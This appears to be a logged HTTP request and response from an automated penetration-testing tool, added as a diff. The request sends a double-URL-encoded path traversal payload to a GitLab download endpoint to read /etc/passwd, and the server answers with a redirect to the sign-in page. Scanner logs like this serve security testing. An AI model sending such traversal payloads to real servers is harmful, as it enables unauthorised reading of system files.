@@ -1,0 +1,31 @@
+REQUEST:
+GET https://gitlab.baliprov.dev/download?filename=%252e%252e%2F%252e%252e%2F%252e%252e%2Fetc%2Fpasswd
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 302
+Server: nginx
+Date: Wed, 25 Nov 2026 00:13:13 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 107
+Connection: keep-alive
+Cache-Control: no-cache
+Content-Security-Policy: 
+Location: https://gitlab.baliprov.dev/users/sign_in
+NEL: {"max_age": 0}
+Permissions-Policy: interest-cohort=()
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Gitlab-Meta: {"correlation_id":"01M880S8QZZJQMTF27ENKE1SJ0","version":"1"}
+X-Permitted-Cross-Domain-Policies: none
+X-Request-ID: 01M880S8QZZJQMTF27ENKE1SJ0
+X-Runtime: 0.027742
+X-Ua-Compatible: IE=edge
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=63072000
+Referrer-Policy: strict-origin-when-cross-origin
+
+<html><body>You are being <a href="https://gitlab.baliprov.dev/users/sign_in">redirected</a>.</body></html>
